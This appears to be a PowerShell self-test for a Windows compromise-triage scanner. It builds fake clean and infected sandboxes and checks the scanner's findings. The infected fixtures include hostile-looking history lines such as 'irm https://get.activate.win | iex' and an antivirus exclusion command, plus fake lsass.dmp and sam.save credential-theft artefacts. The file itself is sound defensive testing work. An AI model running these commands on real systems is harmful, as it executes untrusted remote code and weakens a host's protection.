<#
.SYNOPSIS
    Self-test for Invoke-WinTriage.ps1 against fake data (no access to the real system).
    Works with PowerShell 7 on Windows, Linux or macOS:  pwsh ./tests/Run-SelfTest.ps1
    Exit code 0 when every scenario gives the expected result.
    -KeepReports <folder>: keep the generated reports (one subfolder per scenario).
#>
param([string]$KeepReports, [switch]$UpdateExpected)
$ErrorActionPreference = 'Stop'
$root   = Split-Path -Parent $PSScriptRoot
$script = Join-Path $root 'Invoke-WinTriage.ps1'
$shell  = (Get-Process -Id $PID).Path
$fail   = 0
# Reference list of the findings the compromised scenario must keep producing.
# Titles are normalized first: a run must not differ because of a timestamp or a temp folder name.
$expectedFile = Join-Path $PSScriptRoot 'Expected-Infected.txt'
function Get-StableTitle([string]$s) {
    $s = $s -replace '\d{4}-\d{2}-\d{2}([T ]\d{2}:\d{2}(:\d{2})?)?', '<date>'
    $s = $s -replace '\d{1,2}/\d{1,2}/\d{2,4}([ ,]+\d{1,2}:\d{2}(:\d{2})?( ?[AaPp]\.?[Mm]\.?)?)?', '<date>'
    $s = $s -replace '(?i)wintriage_[0-9a-f]{8,}', '<sandbox>'
    # Not anchored to the start of the string: a title like "Authorised SSH keys: C:\Users\<real
    # name>\AppData\...\<sandbox>" never begins with the drive letter, so an anchored regex here
    # would leave the real Windows username sitting in the committed reference file.
    $s = $s -replace '(?i)[A-Z]:\\.*?\\<sandbox>', '<tmp>\<sandbox>'
    $s -replace '\b\d{3,}\b', '<n>'
}
# Windows Script Host, used to render the HTML report against a DOM shim. Absent elsewhere.
$cscript = if ($env:OS -eq 'Windows_NT') { (Get-Command cscript.exe -ErrorAction SilentlyContinue).Source } else { $null }
if (-not $cscript) { Write-Host 'NOTE   cscript unavailable: the HTML rendering test is skipped.' -ForegroundColor DarkGray }

function New-Sandbox([string]$Scenario) {
    $sb = Join-Path ([IO.Path]::GetTempPath()) ("wintriage_" + [guid]::NewGuid().ToString('N'))
    $home1 = Join-Path $sb 'Users/alice'
    $dirs = 'Windows/System32/drivers/etc', 'Windows/Temp', 'Program Files/Microsoft Office/root/vfs/System', 'Program Files (x86)', 'ProgramData', 'Users/Public',
            'Users/alice/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine', 'Users/alice/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup',
            'Users/alice/AppData/Local/Temp', 'Users/alice/.ssh'
    foreach ($d in $dirs) { $null = New-Item -ItemType Directory -Force -Path (Join-Path $sb $d) }
    Set-Content (Join-Path $sb 'Windows/System32/drivers/etc/hosts') "# hosts`n127.0.0.1 localhost"
    Set-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt') "Get-ChildItem`ngit status"
    Set-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Contoso.lnk') 'lnk'
    # A harmless Chrome extension: inventory only, no alert
    $ext = Join-Path $home1 'AppData/Local/Google/Chrome/User Data/Default/Extensions/aaaabbbbccccddddeeeeffffgggghhhh/1.2'
    $null = New-Item -ItemType Directory -Force -Path $ext
    Set-Content (Join-Path $ext 'manifest.json') '{ "name": "Contoso Notes", "version": "1.2", "permissions": ["storage"] }'
    if ($Scenario -eq 'infected') {
        Set-Content (Join-Path $sb 'Program Files/Microsoft Office/root/vfs/System/sppc.dll') 'x'
        Set-Content (Join-Path $sb 'Program Files/Microsoft Office/root/vfs/System/sppcs.dll') 'x'
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $sb 'Program Files/Activation-Renewal')
        Set-Content (Join-Path $sb 'Program Files/Activation-Renewal/Activation_task.cmd') 'x'
        Add-Content (Join-Path $sb 'Windows/System32/drivers/etc/hosts') "0.0.0.0 ols.officeapps.live.com`n0.0.0.0 update.microsoft.com"
        Add-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt') "irm https://get.activate.win | iex`nirm https://get.activated.win | iex`nAdd-MpPreference -ExclusionPath C:\Users\alice\AppData"
        Set-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.vbs') 'CreateObject("WScript.Shell").Run "x"'
        Set-Content (Join-Path $home1 '.ssh/authorized_keys') 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKE svc-telemetry'
        Set-Content (Join-Path $sb 'Users/Public/unsigned_tool.exe') 'MZ'
        # Extension with powerful permissions and a localized name, to exercise both code paths
        $bad = Join-Path $home1 'AppData/Local/Google/Chrome/User Data/Default/Extensions/ponmlkjihgfedcbaponmlkjihgfedcba/2.0'
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $bad '_locales/en')
        Set-Content (Join-Path $bad 'manifest.json') '{ "name": "__MSG_extName__", "version": "2.0", "default_locale": "en", "permissions": ["debugger", "nativeMessaging", "tabs"], "host_permissions": ["<all_urls>"] }'
        Set-Content (Join-Path $bad '_locales/en/messages.json') '{ "extName": { "message": "Secure Shopping Helper" } }'
        # Credential theft artefacts: a process memory dump and a copy of a registry hive
        [IO.File]::WriteAllBytes((Join-Path $sb 'Users/Public/lsass.dmp'), ([byte[]][char[]]'MDMP' + (New-Object byte[] 64)))
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $home1 'Downloads')
        [IO.File]::WriteAllBytes((Join-Path $home1 'Downloads/sam.save'), ([byte[]][char[]]'regf' + (New-Object byte[] 64)))
        # amsi.dll dropped where a program would load it instead of the real one
        Set-Content (Join-Path $sb 'Users/Public/amsi.dll') 'MZ'
        # Desktop shortcut carrying injected browser options (see Resolve-Lnk in Mocks.ps1)
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $home1 'Desktop')
        Set-Content (Join-Path $home1 'Desktop/Chrome.lnk') 'lnk'
    }
    $sb
}

function Invoke-Scenario([string]$Scenario, [int]$ExpectedExit, [string[]]$MustFind, [switch]$NothingAboveInfo, [string]$Language = 'en') {
    $sb = New-Sandbox $Scenario
    $env:WINTRIAGE_SCENARIO = $Scenario; $env:WINTRIAGE_SANDBOX = $sb
    $old = $env:USERPROFILE; $env:USERPROFILE = Join-Path $sb 'Users/alice'
    try {
        $out = Join-Path $sb 'reports'
        & $shell -NoProfile -File $script -TestHooks (Join-Path $PSScriptRoot 'Mocks.ps1') -OutputDir $out -Language $Language | Out-Null
        $code = $LASTEXITCODE
        $json = Get-Content -Raw (Get-ChildItem $out -Filter *.json | Select-Object -First 1).FullName | ConvertFrom-Json
        $html = Get-ChildItem $out -Filter *.html | Select-Object -First 1
        if ($KeepReports) { $dst = Join-Path $KeepReports $Scenario; $null = New-Item -ItemType Directory -Force -Path $dst; Copy-Item (Join-Path $out '*') $dst -Force }
        $errors = @()
        if ($code -ne $ExpectedExit) { $errors += "exit code $code instead of $ExpectedExit" }
        if (-not $html -or $html.Length -lt 3000) { $errors += 'HTML report missing or empty' }
        foreach ($c in $json.Checks) { if ($c.Error) { $errors += "check '$($c.Name)' interrupted: $($c.Error)" } }
        $real = @($json.Findings | Where-Object { $_.Severity -ne 'Info' })
        foreach ($m in $MustFind) { if (-not ($real | Where-Object { $_.Title.en -match $m })) { $errors += "expected finding missing: $m" } }
        # Regression guard: the self-test's own fixtures (tests\Mocks.ps1) must never be counted
        # as a detection when that same log entry would, on a real host, flag the test run itself.
        if ($Scenario -eq 'infected') {
            $kmsLog = $real | Where-Object { $_.Title.en -match 'KMS tampering.*PowerShell log' }
            if (-not $kmsLog) { $errors += 'missing: KMS tampering finding from the PowerShell log' }
            elseif ($kmsLog.Detail.en -notmatch '^1 logged script block') {
                $errors += "WinTriage's own test fixture was not excluded from the PowerShell log detection: $($kmsLog.Detail.en)"
            }
        }
        # Every finding must carry both languages
        foreach ($f in $json.Findings) {
            if (-not "$($f.Title.en)".Trim() -or -not "$($f.Title.fr)".Trim()) { $errors += "finding without a bilingual title: $($f.Title.en)$($f.Title.fr)"; break }
        }
        # The HTML report must embed both languages, the switch, and open in the requested one
        $htmlText = Get-Content -Raw $html.FullName
        foreach ($needle in 'data-lang="en"', 'data-lang="fr"', 'wintriage.lang') { if ($htmlText -notmatch [regex]::Escape($needle)) { $errors += "HTML report without the language switch ($needle)" } }
        if ($htmlText -notmatch "<html lang=`"$Language`"") { $errors += "HTML report does not open in '$Language'" }
        if ($htmlText -notmatch "`"lang`":`"$Language`"") { $errors += "report data does not carry the '$Language' default" }
        # Render the page against a DOM shim to prove both languages really display (Windows only)
        if ($cscript) {
            $render = & $cscript //nologo (Join-Path $PSScriptRoot 'Test-ReportRender.js') $html.FullName 2>&1
            if ($LASTEXITCODE -ne 0) { $errors += @($render | ForEach-Object { "render: $($_.ToString().Trim())" }) }
        }
        if ($NothingAboveInfo -and $real.Count) { $errors += 'false positives: ' + (($real | ForEach-Object { "[$($_.Severity)] $($_.Title.en)" }) -join ' | ') }
        # The timeline must pick up the dated artefacts of a compromised host
        if ($Scenario -eq 'infected' -and @($json.Timeline).Count -lt 5) { $errors += "timeline nearly empty ($(@($json.Timeline).Count) entries)" }
        # Non-regression: every finding recorded in the reference must still be detected
        if ($Scenario -eq 'infected') {
            $titles = @($real | ForEach-Object { Get-StableTitle "$($_.Title.en)" } | Sort-Object -Unique)
            # The reference file gets committed to the repo: it must never carry the real machine's
            # username or an un-normalized absolute path, whoever runs this self-test.
            $leak = @($titles | Where-Object { $_ -match '(?i)[A-Z]:\\Users\\(?!alice\\|Public\\)[^\\]+\\' })
            if ($leak.Count) { $errors += "REGRESSION: finding title(s) leak a real path into the reference: $($leak -join ' | ')" }
            if ($UpdateExpected) {
                # UTF-8 with a BOM: Windows PowerShell 5.1 reads a BOM-less file as ANSI
                [IO.File]::WriteAllLines($expectedFile, [string[]]$titles, (New-Object System.Text.UTF8Encoding($true)))
                Write-Host "       reference refreshed: $($titles.Count) finding titles" -ForegroundColor DarkGray
            }
            elseif (Test-Path -LiteralPath $expectedFile) {
                $ref = @(Get-Content -LiteralPath $expectedFile -Encoding UTF8 | Where-Object { $_.Trim() })
                $lost = @($ref | Where-Object { $titles -notcontains $_ })
                $added = @($titles | Where-Object { $ref -notcontains $_ })
                foreach ($l in $lost) { $errors += "REGRESSION: finding no longer detected: $l" }
                if ($added.Count) {
                    Write-Host "       $($added.Count) new finding(s) since the reference (run with -UpdateExpected to record them):" -ForegroundColor DarkGray
                    $added | ForEach-Object { Write-Host "         + $_" -ForegroundColor DarkGray }
                }
            }
            else { Write-Host "       no reference yet: run with -UpdateExpected to create $(Split-Path $expectedFile -Leaf)" -ForegroundColor DarkGray }
        }
        if ($errors.Count) { $script:fail++; Write-Host "FAIL   $Scenario" -ForegroundColor Red; $errors | ForEach-Object { Write-Host "   - $_" -ForegroundColor Red } }
        else { Write-Host ("OK     {0,-9} {1} finding(s) above Info, {2} checks, exit code {3}, report opens in {4}" -f $Scenario, $real.Count, $json.Checks.Count, $code, $Language) -ForegroundColor Green }
    } finally {
        $env:USERPROFILE = $old
        Remove-Item -Recurse -Force $sb -ErrorAction SilentlyContinue
    }
}

# Baseline, allowlist and fix script: several runs over the same sandbox
function Invoke-FeatureTests {
    $sb = New-Sandbox 'infected'
    $env:WINTRIAGE_SCENARIO = 'infected'; $env:WINTRIAGE_SANDBOX = $sb
    $old = $env:USERPROFILE; $env:USERPROFILE = Join-Path $sb 'Users/alice'
    $errors = @()
    try {
        $hooks = Join-Path $PSScriptRoot 'Mocks.ps1'
        function Run([string]$Out, [string[]]$Extra) {
            & $shell -NoProfile -File $script -TestHooks $hooks -OutputDir $Out -NoAllowlist @Extra | Out-Null
            $code = $LASTEXITCODE
            $f = Get-ChildItem $Out -Filter *.json | Sort-Object LastWriteTime | Select-Object -Last 1
            [pscustomobject]@{ Code = $code; Json = (Get-Content -Raw $f.FullName | ConvertFrom-Json); Path = $f.FullName; Dir = $Out }
        }
        # 1. A run, then the same run compared with itself: nothing should look new
        $a = Run (Join-Path $sb 'r1') @()
        if (-not $a.Json.Findings) { $errors += 'baseline: first run produced no finding' }
        $b = Run (Join-Path $sb 'r2') @('-Baseline', $a.Path)
        if ($b.Json.Meta.NewSinceBaseline -ne 0) { $errors += "baseline: $($b.Json.Meta.NewSinceBaseline) finding(s) seen as new against an identical run (finding keys are unstable)" }
        if (@($b.Json.Findings).Count -ne @($a.Json.Findings).Count) { $errors += 'baseline: the comparison changed the number of findings' }
        # 2. -NewOnly against that same baseline must leave an empty report and a clean exit code
        $c = Run (Join-Path $sb 'r3') @('-Baseline', $a.Path, '-NewOnly')
        if (@($c.Json.Findings).Count -ne 0) { $errors += "-NewOnly: $(@($c.Json.Findings).Count) finding(s) listed although none is new" }
        if ($c.Code -ne 0) { $errors += "-NewOnly: exit code $($c.Code) instead of 0 with nothing new" }
        if ($c.Json.Meta.KnownHidden -lt 1) { $errors += '-NewOnly: the report does not say how many known findings were hidden' }
        # 3. Allowlist: one active rule suppresses, one expired rule does not
        $al = Join-Path $sb 'allowlist.psd1'
        Set-Content -LiteralPath $al -Encoding UTF8 -Value @'
@{
    Suppress = @(
        @{ Title = 'Ohook: sppcs\.dll link'; Reason = 'test rule'; Author = 'selftest'; Expires = '2099-01-01' }
        @{ Title = 'Dummy KMS address'; Reason = 'stale rule'; Author = 'selftest'; Expires = '2000-01-01' }
    )
}
'@
        & $shell -NoProfile -File $script -TestHooks $hooks -OutputDir (Join-Path $sb 'r4') -AllowlistFile $al | Out-Null
        $d = Get-Content -Raw (Get-ChildItem (Join-Path $sb 'r4') -Filter *.json | Select-Object -First 1).FullName | ConvertFrom-Json
        if (@($d.Findings | Where-Object { $_.Title.en -match 'Ohook: sppcs\.dll link' }).Count) { $errors += 'allowlist: the suppressed finding is still in the results' }
        $sup = @($d.Suppressed | Where-Object { $_.Title.en -match 'Ohook: sppcs\.dll link' })
        if (-not $sup.Count) { $errors += 'allowlist: the suppressed finding is not listed in the suppressed section' }
        elseif ("$($sup[0].Suppressed.Reason)" -ne 'test rule') { $errors += 'allowlist: the suppression reason was not kept' }
        if (-not @($d.Findings | Where-Object { $_.Title.en -match 'Dummy KMS address' }).Count) { $errors += 'allowlist: an expired rule still suppressed its finding' }
        if (-not @($d.Meta.ExpiredSuppressions).Count) { $errors += 'allowlist: the expired rule is not reported' }
        if ($d.Meta.SuppressedCount -lt 1) { $errors += 'allowlist: SuppressedCount not filled in' }
        # 4. Fix script: produced, and not a single runnable line
        $e = Run (Join-Path $sb 'r5') @('-FixScript')
        $fix = Get-ChildItem (Join-Path $sb 'r5') -Filter '*.fix.ps1' | Select-Object -First 1
        if (-not $fix) { $errors += '-FixScript: no .fix.ps1 written' }
        else {
            $live = @(Get-Content -LiteralPath $fix.FullName | Where-Object { $_.Trim() -and $_.Trim() -notmatch '^(#|<#|#>)' })
            if ($live.Count) { $errors += "-FixScript: $($live.Count) line(s) are not commented out, starting with: $($live[0])" }
            if ((Get-Content -Raw $fix.FullName).Length -lt 500) { $errors += '-FixScript: file suspiciously short' }
        }
        if ($KeepReports) {
            $dst = Join-Path $KeepReports 'features'; $null = New-Item -ItemType Directory -Force -Path $dst
            Copy-Item (Join-Path $sb 'r*\*') $dst -Force
        }
        if ($errors.Count) { $script:fail++; Write-Host 'FAIL   features' -ForegroundColor Red; $errors | ForEach-Object { Write-Host "   - $_" -ForegroundColor Red } }
        else { Write-Host 'OK     features  baseline, -NewOnly, allowlist (active + expired), fix script all behave' -ForegroundColor Green }
    } finally {
        $env:USERPROFILE = $old
        Remove-Item -Recurse -Force $sb -ErrorAction SilentlyContinue
    }
}

Invoke-Scenario 'clean' 0 @() -NothingAboveInfo
Invoke-Scenario 'infected' 2 @(
    'Ohook: sppc\.dll replaced', 'Ohook: sppcs\.dll link', 'Activator file or folder: Activation-Renewal', 'Activator service: KMSELDI',
    'Dummy KMS address: 10\.0\.0\.10', 'abnormal duration', 'Office subscription check neutralised', 'Microsoft licensing domains redirected',
    'Fake MAS domain', 'Microsoft Activation Scripts', 'Antivirus exclusion added',
    'Run key \(alice\): Updater', 'Run key \(alice\): Helper', 'Script in the Startup folder', 'Task: \\OneDrive Sync Helper',
    'Hidden task .*SysMon', 'invisible to the API: \\Activation-Renewal', 'WMI subscription that runs code', 'Winlogon: Userinit modified',
    'Debugger attached to sethc\.exe', 'all macros are enabled', 'Local account hidden', 'Authorised SSH keys', 'Remote access tool present: anydesk',
    'Real-time protection disabled', 'Very broad antivirus exclusion', 'Antivirus detection: HackTool', 'Security or update domains redirected',
    'Process impersonating a system name: svchost\.exe', 'Recent unsigned executable: unsigned_tool\.exe', 'Event log cleared', 'Service installed on .*: WinUpd',
    'BITS job with a notification command',
    # Security settings
    'Clear-text passwords kept in memory', 'UAC disabled', 'Remote administration with local accounts allowed',
    'AlwaysInstallElevated enabled', 'DisableTaskMgr', 'SMB1 file sharing enabled', 'Automatic updates disabled by policy',
    # Registry persistence added alongside
    'Non-standard crash debugger', 'cmd\.exe AutoRun defined', 'File type handler hijacked.*ms-settings', 'Service recovery command: ContosoAgent',
    # Remote access and antivirus layers
    'WinRM accepting unencrypted', 'Script scanning disabled', 'Cloud-delivered protection disabled',
    # Kernel drivers
    'Unsigned kernel driver: evil\.sys', 'Driver known to be abused: RTCore64\.sys', 'Test signing enabled at boot',
    'vulnerable driver blocklist disabled',
    # Browser extensions
    'extension force-installed from a third-party server', 'extension sideloaded through the registry',
    'extension with powerful permissions.*Secure Shopping Helper',
    # Registry and shell persistence added in 1.2.0
    'KnownDLLs entry with a path', 'Unsigned context menu handler',
    # Office and Outlook
    'Word add-in \(alice\): Evil\.Connect', 'Outlook: unsafe client rules allowed', 'Outlook: home page set on the Inbox folder',
    # AMSI
    'AMSI disabled for Windows Script Host', 'Unsigned AMSI provider', 'amsi\.dll placed outside the system folder',
    # Credential theft traces
    'Process memory dump on disk: lsass\.dmp', 'Copy of a registry hive or credential store: sam\.save',
    # Network
    'Inbound firewall rule for a program in a temporary folder', 'DNS server set by hand to an unknown address',
    'Name resolution redirected by policy',
    # Services and events
    'Service DLL outside the system folders: EvilSvc', 'Unquoted service path with spaces: ContosoUpd',
    'Start type of the WinDefend service changed',
    # Certificates and shortcuts
    'TLS interception certificate trusted', 'Root certificate authority added recently',
    'Browser shortcut carrying injected options'
)
# Same data, report opening in French
Invoke-Scenario 'clean' 0 @() -NothingAboveInfo -Language fr
Invoke-FeatureTests
if ($fail) { Write-Host "$fail scenario(s) failed." -ForegroundColor Red; exit 1 }
Write-Host 'Self-test passed.' -ForegroundColor Green
exit 0   # explicit: otherwise the exit code is inherited from the last scan, which exits 2 by design
